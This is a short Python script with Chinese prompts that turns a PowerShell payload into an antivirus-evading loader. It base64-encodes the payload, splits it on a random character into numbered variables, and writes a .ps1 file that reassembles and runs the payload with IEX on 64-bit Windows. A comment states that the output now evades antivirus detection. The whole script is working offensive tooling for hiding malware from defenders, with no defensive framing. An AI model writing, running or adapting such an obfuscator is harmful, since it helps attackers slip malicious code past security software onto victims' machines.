#encoding:utf-8
import os
import sys
import re
import base64
import getopt
import random
def ShellMake():
    PATH=input("请输入Payload路径:")
    #读取文件
    with open (PATH,"r+") as payload:
        encode=payload.read()
    Before_encode=re.findall("function (.*)",encode,re.S)
    Tmp_encode="function "+Before_encode[0]
    Temp_encode=base64.b64encode(Tmp_encode.encode('utf-8'))
    After_encode=str(Temp_encode)
    After_encode=After_encode[2:-1]
    Split_Chr=random.randint(65,122)
    while Split_Chr >= 91 and Split_Chr<=96:
        Split_Chr=random.randint(65,122)
    Split_Chr=chr(Split_Chr)
    Final_encode=After_encode.split(Split_Chr)
    Len=len(Final_encode)
    Long_str=''
    for i in range(0,Len-1):
        Final_encode[i]=Final_encode[i]+Split_Chr
        Long_str=Long_str+"$Doit"+str(i)+"+"
    #写入新的ps1,此时已经免杀
    Long_str=Long_str[0:-1]+"+$Doit"+str(Len-1)
    Destion=input("请输入输出目标:")
    with open(Destion,"a+") as payload:
        payload.writelines("Set-StrictMode -Version 2 \n")
        for i in range(0,Len):
            payload.writelines("$Doit"+str(i)+"='"+Final_encode[i]+"'\n")
        payload.writelines("$testforwindow=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("+Long_str+")) \n")
        payload.writelines("If ([IntPtr]::size -eq 8) {"+'\n')
        payload.writelines("IEX $testforwindow"+'\n')
        payload.writelines("}")
ShellMake()